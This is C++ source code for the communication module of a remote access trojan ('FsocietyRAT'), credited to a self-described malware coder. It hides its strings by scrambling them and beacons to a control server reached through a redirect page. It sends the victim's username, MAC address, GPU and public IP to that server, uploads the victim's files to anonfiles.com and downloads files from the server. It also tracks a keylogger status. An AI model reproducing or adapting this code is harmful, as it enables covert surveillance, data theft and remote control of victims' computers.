/*
##################################################
#                                                #
#         Malware Coder: Elliot Alderson         #
#                                                #
#   Github: https://github.com/ElliotAlderson51  #
#                                                #
##################################################
*/

#include "CURL.h"

Curl::Curl()
{
	this->Keylogger_status = FALSE;

	this->redirect_website = decode("so/FesitbsWeATyRetciso/F.5.0.010//p:ttlhtm.hgePactrediree/itbsWectrediRetyiec"); // decode -> http://10.0.0.5/FsocietyRATWebsites/FsocietyRedirectWebsite/redirectPage.html
	this->mac_address = Tools::CMD(decode("et gueTrr=teapAdalicysPhe erwhc nic mi2wt rsFi - 1ipSk -ctlese| s esdrAdAC M"), TRUE, TRUE); // decode -> wmic nic where PhysicalAdapter=True get MACAddress | select -Skip 1 -First 2
	if (this->mac_address.find(':') != std::string::npos)
		this->mac_address.erase(std::remove(this->mac_address.begin(), this->mac_address.end(), ':'), this->mac_address.end());

	this->Initialize();

	this->Control();
}


void Curl::Initialize()
{
	std::string check_status = "";
	int check_count = 0;

	// Get the control website url from the redirect website
	while (this->control_website == "")
		if (!Send_Recv(this->control_website, this->redirect_website))
			Sleep(10000);
	
	// Check if the control website is working
	do
	{
		check_count++;
		Send_Recv(check_status, "", "", TRUE);
		if (check_count == 10)
			Initialize();

	} while (check_status.find(Tools::decode("ot N04d4unFo ")) != std::string::npos || check_count == 10); // decode -> 404 Not Found

	// Send Information: PC Name, GPU
	std::string ip = "";
	this->Send_Recv(ip, Tools::decode("ntdeei.m")); // decode -> ident.me
	std::string pc_name = Tools::CMD(decode("oawhmi"), TRUE); // decode -> whoami
	std::string gpu = Tools::CMD(decode("eoid_V32in wthpac miewam net gerllrontCo"), TRUE); // decode -> wmic path win32_VideoController get name
	this->Send_Recv(check_status, "", decode("ip=&") + ip + decode("_npc=&mea") + pc_name + decode("gp=&u") + gpu + ""); // decode -> &ip=, &pc_name=, &gpu=
}

// This function make it easy to communicate with a website using curl
BOOL Curl::Send_Recv(std::string& result, std::string website, std::string parametres, BOOL isInitializing)
{
	if (website == "")
	{
		website = this->control_website + decode("bo=?t") + this->mac_address; // decode -> ?bot=
		if (parametres != "")
			website += parametres;

#ifndef LOG_OFF
		std::cout << "\n\nwebsite:" + website + ";\n\n";
#endif // !LOG_OFF
	}

	std::string command = Tools::decode("urlc") + " \"" + website + "\""; // decode -> curl
	result = Tools::CMD(command.c_str());

	if (result.find(Tools::decode(" FotdNuno")) != std::string::npos && !isInitializing) 
	{
		if (website == this->control_website || website == this->redirect_website)
		{
			this->control_website = "";
			Initialize();
		}
		return FALSE;
	}
	else if (result == "" || result == "\n")
		return FALSE;

	return TRUE;
}

// Get word from string by specify index
std::string Curl::getWord(const std::string& str, int index)
{
	std::string word = "";
	int word_count = 1;
	for (size_t i = 0; i < str.length() && word_count <= index; i++)
	{
		if (str[i] == ' ')
			word_count++;
		else if (index == word_count)
			word += str[i];
	}

	return word;
}

// Upload file to anonfiles.com and return the url
std::string Curl::anonFilesUpload(const std::string& file_path)
{
	if (Tools::FileExists(file_path))
	{
		std::string url = "";
		std::string command = Tools::decode("F  -rlcu=@lefi\"") + file_path + "\"" + Tools::decode("nfno.api/a:/psttdhoapl/uom.cesil"); // decode -> curl -F \"file=@, https://api.anonfiles.com/upload
		std::string result = Tools::CMD(command);
		if (result.find(Tools::decode("s\"tutaesru:t"))) // decode -> status\":true
		{
			int index = result.find(decode("ttshp")); // decode -> https
			if (index)
				for (size_t i = index; i < result.length() && result[i] != '"'; i++)
					url += result[i];

			return url;
		}
	}

	return "";
}

// Download file from the uploads/ folder in the control website
BOOL Curl::DownloadFile(const std::string& file)
{
	if (file != "")
	{
		std::size_t found = this->control_website.find_last_of("/\\");
		std::string uploads_path = this->control_website.substr(0, found) + "\\" + Tools::decode("") + "\\"; // decode -> uploads

		std::string command = Tools::decode("ur cl") + uploads_path + file + Tools::decode("ut-o -t pu") + file; // decode -> curl, --ouput
		Tools::CMD(command);

		HANDLE hFile = CreateFileA(file.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile != INVALID_HANDLE_VALUE)
		{
			LARGE_INTEGER size;
			if (GetFileSizeEx(hFile, &size))
			{
				CloseHandle(hFile);
				return TRUE; // error condition, could call GetLastError to find out more
			}
		}
	}

	if (Tools::FileExists(file))
		DeleteFileA(file.c_str());

	return FALSE;
}